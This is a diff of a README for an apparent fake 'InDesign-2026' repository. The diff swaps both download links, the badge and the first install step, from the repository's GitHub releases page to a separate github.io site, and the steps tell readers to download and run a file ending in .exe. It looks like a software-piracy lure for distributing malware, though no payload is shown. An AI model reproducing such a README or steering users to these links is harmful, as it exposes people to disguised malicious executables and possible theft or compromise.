@@ -1,6 +1,6 @@
 # 🎨 InDesign-2026 - Master Your Professional Layout Designs Simply
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/g8s2hell7-debug/InDesign-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://g8s2hell7-debug.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [official release page](https://github.com/g8s2hell7-debug/InDesign-2026/releases) to access the download files.
+1. Visit the [official release page](https://g8s2hell7-debug.github.io) to access the download files.
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
